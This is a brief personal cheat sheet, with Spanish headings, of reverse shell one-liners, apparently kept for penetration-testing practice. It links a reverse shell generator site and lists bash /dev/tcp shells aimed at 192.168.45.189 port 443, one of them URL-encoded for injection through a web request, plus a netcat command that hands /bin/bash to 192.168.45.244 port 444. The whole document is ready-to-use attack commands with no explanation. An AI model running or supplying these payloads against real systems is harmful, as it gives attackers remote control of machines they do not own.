

##### RECURSO REVERSE SHELL
```url
https://revshells.com
```

# LINUX
```shell
bash -c "bash -i >%26 /dev/tcp/192.168.45.189/443 0>%261"

bash -c "bash -i >& /dev/tcp/192.168.45.189/443 0>&1"

bash -i >& /dev/tcp/192.168.45.189/443 0>&1
```

# NC
```shell
/usr/bin/nc 192.168.45.244 444 -e /bin/bash
```
